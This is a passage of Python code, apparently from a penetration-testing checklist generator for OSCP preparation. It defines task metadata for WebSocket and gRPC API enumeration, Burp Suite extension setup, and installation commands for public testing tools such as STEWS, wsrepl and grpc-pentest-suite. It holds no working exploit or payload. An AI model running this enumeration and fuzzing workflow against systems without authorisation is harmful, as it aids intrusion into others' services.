                'description': 'Automated WebSocket discovery, fingerprinting, and vulnerability scanning',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    'stews.py': 'WebSocket enumeration and vulnerability scanner',
                    '-u': 'Target URL',
                    '-s websocket': 'Scan for WebSocket endpoints'
                },
                'success_indicators': [
                    'WebSocket endpoints discovered',
                    'Vulnerabilities identified',
                    'Fingerprint information collected'
                ],
                'failure_indicators': [
                    'No WebSocket endpoints found',
                    'Scan blocked by WAF',
                    'Tool errors/crashes'
                ],
                'next_steps': [
                    'Manually verify discovered endpoints',
                    'Test identified vulnerabilities',
                    'Review fingerprint for version-specific exploits'
                ],
                'alternatives': [
                    'Manual enumeration with websocat',
                    'Burp Suite WebSocket scanning',
                    'Custom Python script with websocket-client'
                ],
                'notes': 'Install: git clone https://github.com/PalindromeLabs/STEWS /opt/STEWS && cd /opt/STEWS && pip3 install -r requirements.txt',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 5.2: Burp Suite extensions
        automated_tasks['children'].append({
            'id': f'burp-extensions-{port}',
            'name': 'Burp Suite Extensions Setup',
            'type': 'manual',
            'metadata': {
                'description': 'Install and configure Burp extensions for API testing',
                'tags': ['OSCP:HIGH', 'SETUP', 'MANUAL'],
                'flag_explanations': {
                    'SocketSleuth': 'WebSocket interception, history, intruder integration',
                    'WebSocket Turbo Intruder': 'High-speed WebSocket fuzzing',
                    'gRPC-Web Coder': 'Decode/encode gRPC-Web payloads in Burp',
                    'BApp Store': 'Burp Suite extension marketplace'
                },
                'success_indicators': [
                    'Extensions installed and active',
                    'WebSocket traffic visible in extensions',
                    'gRPC payloads decoded successfully',
                    'Turbo Intruder scripts loaded'
                ],
                'failure_indicators': [
                    'Extension installation fails',
                    'Extensions not compatible with Burp version',
                    'Java dependencies missing'
                ],
                'next_steps': [
                    'Configure extension settings',
                    'Test extensions with target',
                    'Create custom Turbo Intruder scripts',
                    'Use extensions for vulnerability testing'
                ],
                'alternatives': [
                    'Manual installation from GitHub repos',
                    'Use alternative tools (websocat, grpc-coder)',
                    'Python scripts for automation'
                ],
                'notes': 'RECOMMENDED EXTENSIONS:\n1. SocketSleuth (WebSocket history, interception, intruder)\n2. WebSocket Turbo Intruder (high-speed fuzzing)\n3. gRPC-Web Coder (protobuf manipulation)\n4. Backslash Powered Scanner (WebSocket fuzzing)\n\nInstall via: Extender → BApp Store → Search → Install',
                'estimated_time': '10-15 minutes setup'
            }
        })

        tasks['children'].append(automated_tasks)

        # ===================================================================
        # PHASE 6: Tool Installation & Resources
        # ===================================================================
        tools_tasks = {
            'id': f'api-tools-{port}',
            'name': 'Tool Installation & Resources',
            'type': 'parent',
            'children': []
        }

        tools_tasks['children'].append({
            'id': f'api-tools-install-{port}',
            'name': 'Install API Testing Tools',
            'type': 'manual',
            'metadata': {
                'description': 'Install required tools for API and WebSocket exploitation',
                'tags': ['SETUP', 'OSCP:HIGH'],
                'flag_explanations': {
                    'websocat': 'WebSocket client CLI tool',
                    'grpc-pentest-suite': 'gRPC-Web testing toolkit',
                    'STEWS': 'WebSocket enumeration scanner',
                    'wsrepl': 'Interactive WebSocket REPL',
                    'WSSiP': 'WebSocket proxy with interception'
                },
                'success_indicators': [
                    'All tools installed successfully',
                    'Tools executable from command line',
                    'Dependencies resolved'
                ],
                'failure_indicators': [
                    'Installation errors',
                    'Missing dependencies',
                    'Permission issues'
                ],
                'next_steps': [
                    'Test tools with target',
                    'Create custom scripts',
                    'Configure tool settings'
                ],
                'alternatives': [
                    'Use Docker containers for tools',
                    'Manual tool installation',
                    'Use Kali Linux pre-installed tools'
                ],
                'notes': 'INSTALLATION COMMANDS:\n\n# WebSocket tools\napt install websocat -y\ngit clone https://github.com/doyensec/wsrepl /opt/wsrepl\ngit clone https://github.com/nccgroup/wssip /opt/wssip\n\n# gRPC tools\ngit clone https://github.com/nxenon/grpc-pentest-suite /opt/grpc-pentest-suite\ncd /opt/grpc-pentest-suite && pip3 install -r requirements.txt\n\n# WebSocket scanner\ngit clone https://github.com/PalindromeLabs/STEWS /opt/STEWS\ncd /opt/STEWS && pip3 install -r requirements.txt\n\nOSCP: Install these tools BEFORE exam.',
                'estimated_time': '20-30 minutes'
            }
        })

        tasks['children'].append(tools_tasks)

        return tasks
